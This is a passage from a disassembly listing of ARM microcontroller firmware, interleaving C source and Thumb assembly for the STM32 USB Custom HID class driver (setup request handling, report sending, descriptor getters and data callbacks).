 800884e:	b2db      	uxtb	r3, r3
 8008850:	461a      	mov	r2, r3
 8008852:	693b      	ldr	r3, [r7, #16]
 8008854:	615a      	str	r2, [r3, #20]
          break;
 8008856:	e01d      	b.n	8008894 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008858:	693b      	ldr	r3, [r7, #16]
 800885a:	3314      	adds	r3, #20
 800885c:	2201      	movs	r2, #1
 800885e:	4619      	mov	r1, r3
 8008860:	6878      	ldr	r0, [r7, #4]
 8008862:	f003 fcfd 	bl	800c260 <USBD_CtlSendData>
          break;
 8008866:	e015      	b.n	8008894 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008868:	693b      	ldr	r3, [r7, #16]
 800886a:	2201      	movs	r2, #1
 800886c:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 800886e:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008870:	683b      	ldr	r3, [r7, #0]
 8008872:	88db      	ldrh	r3, [r3, #6]
 8008874:	2b0f      	cmp	r3, #15
 8008876:	bf28      	it	cs
 8008878:	230f      	movcs	r3, #15
 800887a:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 800887c:	461a      	mov	r2, r3
 800887e:	6878      	ldr	r0, [r7, #4]
 8008880:	f003 fd1a 	bl	800c2b8 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008884:	e006      	b.n	8008894 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 8008886:	6839      	ldr	r1, [r7, #0]
 8008888:	6878      	ldr	r0, [r7, #4]
 800888a:	f003 fc78 	bl	800c17e <USBD_CtlError>
          ret = USBD_FAIL;
 800888e:	2303      	movs	r3, #3
 8008890:	75fb      	strb	r3, [r7, #23]
          break;
 8008892:	bf00      	nop
      }
      break;
 8008894:	e09a      	b.n	80089cc <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008896:	683b      	ldr	r3, [r7, #0]
 8008898:	785b      	ldrb	r3, [r3, #1]
 800889a:	2b0b      	cmp	r3, #11
 800889c:	f200 8086 	bhi.w	80089ac <USBD_CUSTOM_HID_Setup+0x204>
 80088a0:	a201      	add	r2, pc, #4	; (adr r2, 80088a8 <USBD_CUSTOM_HID_Setup+0x100>)
 80088a2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80088a6:	bf00      	nop
 80088a8:	080088d9 	.word	0x080088d9
 80088ac:	080089bb 	.word	0x080089bb
 80088b0:	080089ad 	.word	0x080089ad
 80088b4:	080089ad 	.word	0x080089ad
 80088b8:	080089ad 	.word	0x080089ad
 80088bc:	080089ad 	.word	0x080089ad
 80088c0:	08008903 	.word	0x08008903
 80088c4:	080089ad 	.word	0x080089ad
 80088c8:	080089ad 	.word	0x080089ad
 80088cc:	080089ad 	.word	0x080089ad
 80088d0:	0800895b 	.word	0x0800895b
 80088d4:	08008985 	.word	0x08008985
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088d8:	687b      	ldr	r3, [r7, #4]
 80088da:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088de:	b2db      	uxtb	r3, r3
 80088e0:	2b03      	cmp	r3, #3
 80088e2:	d107      	bne.n	80088f4 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80088e4:	f107 030e 	add.w	r3, r7, #14
 80088e8:	2202      	movs	r2, #2
 80088ea:	4619      	mov	r1, r3
 80088ec:	6878      	ldr	r0, [r7, #4]
 80088ee:	f003 fcb7 	bl	800c260 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088f2:	e063      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088f4:	6839      	ldr	r1, [r7, #0]
 80088f6:	6878      	ldr	r0, [r7, #4]
 80088f8:	f003 fc41 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 80088fc:	2303      	movs	r3, #3
 80088fe:	75fb      	strb	r3, [r7, #23]
          break;
 8008900:	e05c      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008902:	683b      	ldr	r3, [r7, #0]
 8008904:	885b      	ldrh	r3, [r3, #2]
 8008906:	0a1b      	lsrs	r3, r3, #8
 8008908:	b29b      	uxth	r3, r3
 800890a:	2b22      	cmp	r3, #34	; 0x22
 800890c:	d110      	bne.n	8008930 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 800890e:	683b      	ldr	r3, [r7, #0]
 8008910:	88db      	ldrh	r3, [r3, #6]
 8008912:	2b49      	cmp	r3, #73	; 0x49
 8008914:	bf28      	it	cs
 8008916:	2349      	movcs	r3, #73	; 0x49
 8008918:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 800891a:	687b      	ldr	r3, [r7, #4]
 800891c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008920:	687a      	ldr	r2, [r7, #4]
 8008922:	33b0      	adds	r3, #176	; 0xb0
 8008924:	009b      	lsls	r3, r3, #2
 8008926:	4413      	add	r3, r2
 8008928:	685b      	ldr	r3, [r3, #4]
 800892a:	681b      	ldr	r3, [r3, #0]
 800892c:	61bb      	str	r3, [r7, #24]
 800892e:	e00d      	b.n	800894c <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008930:	683b      	ldr	r3, [r7, #0]
 8008932:	885b      	ldrh	r3, [r3, #2]
 8008934:	0a1b      	lsrs	r3, r3, #8
 8008936:	b29b      	uxth	r3, r3
 8008938:	2b21      	cmp	r3, #33	; 0x21
 800893a:	d107      	bne.n	800894c <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 800893c:	4b26      	ldr	r3, [pc, #152]	; (80089d8 <USBD_CUSTOM_HID_Setup+0x230>)
 800893e:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008940:	683b      	ldr	r3, [r7, #0]
 8008942:	88db      	ldrh	r3, [r3, #6]
 8008944:	2b09      	cmp	r3, #9
 8008946:	bf28      	it	cs
 8008948:	2309      	movcs	r3, #9
 800894a:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 800894c:	8bfb      	ldrh	r3, [r7, #30]
 800894e:	461a      	mov	r2, r3
 8008950:	69b9      	ldr	r1, [r7, #24]
 8008952:	6878      	ldr	r0, [r7, #4]
 8008954:	f003 fc84 	bl	800c260 <USBD_CtlSendData>
          break;
 8008958:	e030      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800895a:	687b      	ldr	r3, [r7, #4]
 800895c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008960:	b2db      	uxtb	r3, r3
 8008962:	2b03      	cmp	r3, #3
 8008964:	d107      	bne.n	8008976 <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 8008966:	693b      	ldr	r3, [r7, #16]
 8008968:	3318      	adds	r3, #24
 800896a:	2201      	movs	r2, #1
 800896c:	4619      	mov	r1, r3
 800896e:	6878      	ldr	r0, [r7, #4]
 8008970:	f003 fc76 	bl	800c260 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008974:	e022      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008976:	6839      	ldr	r1, [r7, #0]
 8008978:	6878      	ldr	r0, [r7, #4]
 800897a:	f003 fc00 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 800897e:	2303      	movs	r3, #3
 8008980:	75fb      	strb	r3, [r7, #23]
          break;
 8008982:	e01b      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008984:	687b      	ldr	r3, [r7, #4]
 8008986:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800898a:	b2db      	uxtb	r3, r3
 800898c:	2b03      	cmp	r3, #3
 800898e:	d106      	bne.n	800899e <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008990:	683b      	ldr	r3, [r7, #0]
 8008992:	885b      	ldrh	r3, [r3, #2]
 8008994:	b2db      	uxtb	r3, r3
 8008996:	461a      	mov	r2, r3
 8008998:	693b      	ldr	r3, [r7, #16]
 800899a:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800899c:	e00e      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 800899e:	6839      	ldr	r1, [r7, #0]
 80089a0:	6878      	ldr	r0, [r7, #4]
 80089a2:	f003 fbec 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 80089a6:	2303      	movs	r3, #3
 80089a8:	75fb      	strb	r3, [r7, #23]
          break;
 80089aa:	e007      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 80089ac:	6839      	ldr	r1, [r7, #0]
 80089ae:	6878      	ldr	r0, [r7, #4]
 80089b0:	f003 fbe5 	bl	800c17e <USBD_CtlError>
          ret = USBD_FAIL;
 80089b4:	2303      	movs	r3, #3
 80089b6:	75fb      	strb	r3, [r7, #23]
          break;
 80089b8:	e000      	b.n	80089bc <USBD_CUSTOM_HID_Setup+0x214>
          break;
 80089ba:	bf00      	nop
      }
      break;
 80089bc:	e006      	b.n	80089cc <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 80089be:	6839      	ldr	r1, [r7, #0]
 80089c0:	6878      	ldr	r0, [r7, #4]
 80089c2:	f003 fbdc 	bl	800c17e <USBD_CtlError>
      ret = USBD_FAIL;
 80089c6:	2303      	movs	r3, #3
 80089c8:	75fb      	strb	r3, [r7, #23]
      break;
 80089ca:	bf00      	nop
  }
  return (uint8_t)ret;
 80089cc:	7dfb      	ldrb	r3, [r7, #23]
}
 80089ce:	4618      	mov	r0, r3
 80089d0:	3720      	adds	r7, #32
 80089d2:	46bd      	mov	sp, r7
 80089d4:	bd80      	pop	{r7, pc}
 80089d6:	bf00      	nop
 80089d8:	20000090 	.word	0x20000090

080089dc <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 80089dc:	b580      	push	{r7, lr}
 80089de:	b086      	sub	sp, #24
 80089e0:	af00      	add	r7, sp, #0
 80089e2:	60f8      	str	r0, [r7, #12]
 80089e4:	60b9      	str	r1, [r7, #8]
 80089e6:	4613      	mov	r3, r2
 80089e8:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80089ea:	68fb      	ldr	r3, [r7, #12]
 80089ec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089f0:	68fb      	ldr	r3, [r7, #12]
 80089f2:	32b0      	adds	r2, #176	; 0xb0
 80089f4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089f8:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 80089fa:	697b      	ldr	r3, [r7, #20]
 80089fc:	2b00      	cmp	r3, #0
 80089fe:	d101      	bne.n	8008a04 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008a00:	2303      	movs	r3, #3
 8008a02:	e019      	b.n	8008a38 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008a04:	68fb      	ldr	r3, [r7, #12]
 8008a06:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008a0a:	b2db      	uxtb	r3, r3
 8008a0c:	2b03      	cmp	r3, #3
 8008a0e:	d112      	bne.n	8008a36 <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008a10:	697b      	ldr	r3, [r7, #20]
 8008a12:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008a16:	2b00      	cmp	r3, #0
 8008a18:	d10b      	bne.n	8008a32 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008a1a:	697b      	ldr	r3, [r7, #20]
 8008a1c:	2201      	movs	r2, #1
 8008a1e:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008a22:	4b07      	ldr	r3, [pc, #28]	; (8008a40 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008a24:	7819      	ldrb	r1, [r3, #0]
 8008a26:	88fb      	ldrh	r3, [r7, #6]
 8008a28:	68ba      	ldr	r2, [r7, #8]
 8008a2a:	68f8      	ldr	r0, [r7, #12]
 8008a2c:	f004 f9ea 	bl	800ce04 <USBD_LL_Transmit>
 8008a30:	e001      	b.n	8008a36 <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a32:	2301      	movs	r3, #1
 8008a34:	e000      	b.n	8008a38 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a36:	2300      	movs	r3, #0
}
 8008a38:	4618      	mov	r0, r3
 8008a3a:	3718      	adds	r7, #24
 8008a3c:	46bd      	mov	sp, r7
 8008a3e:	bd80      	pop	{r7, pc}
 8008a40:	200000a6 	.word	0x200000a6

08008a44 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008a44:	b580      	push	{r7, lr}
 8008a46:	b084      	sub	sp, #16
 8008a48:	af00      	add	r7, sp, #0
 8008a4a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a4c:	2181      	movs	r1, #129	; 0x81
 8008a4e:	4815      	ldr	r0, [pc, #84]	; (8008aa4 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a50:	f002 fd32 	bl	800b4b8 <USBD_GetEpDesc>
 8008a54:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a56:	2101      	movs	r1, #1
 8008a58:	4812      	ldr	r0, [pc, #72]	; (8008aa4 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a5a:	f002 fd2d 	bl	800b4b8 <USBD_GetEpDesc>
 8008a5e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a60:	68fb      	ldr	r3, [r7, #12]
 8008a62:	2b00      	cmp	r3, #0
 8008a64:	d009      	beq.n	8008a7a <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a66:	68fb      	ldr	r3, [r7, #12]
 8008a68:	2200      	movs	r2, #0
 8008a6a:	f042 0202 	orr.w	r2, r2, #2
 8008a6e:	711a      	strb	r2, [r3, #4]
 8008a70:	2200      	movs	r2, #0
 8008a72:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a74:	68fb      	ldr	r3, [r7, #12]
 8008a76:	2205      	movs	r2, #5
 8008a78:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a7a:	68bb      	ldr	r3, [r7, #8]
 8008a7c:	2b00      	cmp	r3, #0
 8008a7e:	d009      	beq.n	8008a94 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a80:	68bb      	ldr	r3, [r7, #8]
 8008a82:	2200      	movs	r2, #0
 8008a84:	f042 0202 	orr.w	r2, r2, #2
 8008a88:	711a      	strb	r2, [r3, #4]
 8008a8a:	2200      	movs	r2, #0
 8008a8c:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a8e:	68bb      	ldr	r3, [r7, #8]
 8008a90:	2205      	movs	r2, #5
 8008a92:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008a94:	687b      	ldr	r3, [r7, #4]
 8008a96:	2229      	movs	r2, #41	; 0x29
 8008a98:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008a9a:	4b02      	ldr	r3, [pc, #8]	; (8008aa4 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008a9c:	4618      	mov	r0, r3
 8008a9e:	3710      	adds	r7, #16
 8008aa0:	46bd      	mov	sp, r7
 8008aa2:	bd80      	pop	{r7, pc}
 8008aa4:	20000064 	.word	0x20000064

08008aa8 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008aa8:	b580      	push	{r7, lr}
 8008aaa:	b084      	sub	sp, #16
 8008aac:	af00      	add	r7, sp, #0
 8008aae:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008ab0:	2181      	movs	r1, #129	; 0x81
 8008ab2:	4815      	ldr	r0, [pc, #84]	; (8008b08 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008ab4:	f002 fd00 	bl	800b4b8 <USBD_GetEpDesc>
 8008ab8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008aba:	2101      	movs	r1, #1
 8008abc:	4812      	ldr	r0, [pc, #72]	; (8008b08 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008abe:	f002 fcfb 	bl	800b4b8 <USBD_GetEpDesc>
 8008ac2:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008ac4:	68fb      	ldr	r3, [r7, #12]
 8008ac6:	2b00      	cmp	r3, #0
 8008ac8:	d009      	beq.n	8008ade <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008aca:	68fb      	ldr	r3, [r7, #12]
 8008acc:	2200      	movs	r2, #0
 8008ace:	f042 0202 	orr.w	r2, r2, #2
 8008ad2:	711a      	strb	r2, [r3, #4]
 8008ad4:	2200      	movs	r2, #0
 8008ad6:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008ad8:	68fb      	ldr	r3, [r7, #12]
 8008ada:	2205      	movs	r2, #5
 8008adc:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ade:	68bb      	ldr	r3, [r7, #8]
 8008ae0:	2b00      	cmp	r3, #0
 8008ae2:	d009      	beq.n	8008af8 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ae4:	68bb      	ldr	r3, [r7, #8]
 8008ae6:	2200      	movs	r2, #0
 8008ae8:	f042 0202 	orr.w	r2, r2, #2
 8008aec:	711a      	strb	r2, [r3, #4]
 8008aee:	2200      	movs	r2, #0
 8008af0:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008af2:	68bb      	ldr	r3, [r7, #8]
 8008af4:	2205      	movs	r2, #5
 8008af6:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008af8:	687b      	ldr	r3, [r7, #4]
 8008afa:	2229      	movs	r2, #41	; 0x29
 8008afc:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008afe:	4b02      	ldr	r3, [pc, #8]	; (8008b08 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008b00:	4618      	mov	r0, r3
 8008b02:	3710      	adds	r7, #16
 8008b04:	46bd      	mov	sp, r7
 8008b06:	bd80      	pop	{r7, pc}
 8008b08:	20000064 	.word	0x20000064

08008b0c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008b0c:	b580      	push	{r7, lr}
 8008b0e:	b084      	sub	sp, #16
 8008b10:	af00      	add	r7, sp, #0
 8008b12:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b14:	2181      	movs	r1, #129	; 0x81
 8008b16:	4815      	ldr	r0, [pc, #84]	; (8008b6c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b18:	f002 fcce 	bl	800b4b8 <USBD_GetEpDesc>
 8008b1c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b1e:	2101      	movs	r1, #1
 8008b20:	4812      	ldr	r0, [pc, #72]	; (8008b6c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b22:	f002 fcc9 	bl	800b4b8 <USBD_GetEpDesc>
 8008b26:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b28:	68fb      	ldr	r3, [r7, #12]
 8008b2a:	2b00      	cmp	r3, #0
 8008b2c:	d009      	beq.n	8008b42 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b2e:	68fb      	ldr	r3, [r7, #12]
 8008b30:	2200      	movs	r2, #0
 8008b32:	f042 0202 	orr.w	r2, r2, #2
 8008b36:	711a      	strb	r2, [r3, #4]
 8008b38:	2200      	movs	r2, #0
 8008b3a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b3c:	68fb      	ldr	r3, [r7, #12]
 8008b3e:	2205      	movs	r2, #5
 8008b40:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b42:	68bb      	ldr	r3, [r7, #8]
 8008b44:	2b00      	cmp	r3, #0
 8008b46:	d009      	beq.n	8008b5c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b48:	68bb      	ldr	r3, [r7, #8]
 8008b4a:	2200      	movs	r2, #0
 8008b4c:	f042 0202 	orr.w	r2, r2, #2
 8008b50:	711a      	strb	r2, [r3, #4]
 8008b52:	2200      	movs	r2, #0
 8008b54:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b56:	68bb      	ldr	r3, [r7, #8]
 8008b58:	2205      	movs	r2, #5
 8008b5a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b5c:	687b      	ldr	r3, [r7, #4]
 8008b5e:	2229      	movs	r2, #41	; 0x29
 8008b60:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b62:	4b02      	ldr	r3, [pc, #8]	; (8008b6c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008b64:	4618      	mov	r0, r3
 8008b66:	3710      	adds	r7, #16
 8008b68:	46bd      	mov	sp, r7
 8008b6a:	bd80      	pop	{r7, pc}
 8008b6c:	20000064 	.word	0x20000064

08008b70 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b70:	b480      	push	{r7}
 8008b72:	b083      	sub	sp, #12
 8008b74:	af00      	add	r7, sp, #0
 8008b76:	6078      	str	r0, [r7, #4]
 8008b78:	460b      	mov	r3, r1
 8008b7a:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008b7c:	687b      	ldr	r3, [r7, #4]
 8008b7e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b82:	687b      	ldr	r3, [r7, #4]
 8008b84:	32b0      	adds	r2, #176	; 0xb0
 8008b86:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b8a:	2200      	movs	r2, #0
 8008b8c:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008b90:	2300      	movs	r3, #0
}
 8008b92:	4618      	mov	r0, r3
 8008b94:	370c      	adds	r7, #12
 8008b96:	46bd      	mov	sp, r7
 8008b98:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008b9c:	4770      	bx	lr

08008b9e <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b9e:	b580      	push	{r7, lr}
 8008ba0:	b084      	sub	sp, #16
 8008ba2:	af00      	add	r7, sp, #0
 8008ba4:	6078      	str	r0, [r7, #4]
 8008ba6:	460b      	mov	r3, r1
 8008ba8:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008baa:	687b      	ldr	r3, [r7, #4]
 8008bac:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bb0:	687b      	ldr	r3, [r7, #4]
 8008bb2:	32b0      	adds	r2, #176	; 0xb0
 8008bb4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bb8:	2b00      	cmp	r3, #0
 8008bba:	d101      	bne.n	8008bc0 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008bbc:	2303      	movs	r3, #3
 8008bbe:	e017      	b.n	8008bf0 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bc0:	687b      	ldr	r3, [r7, #4]
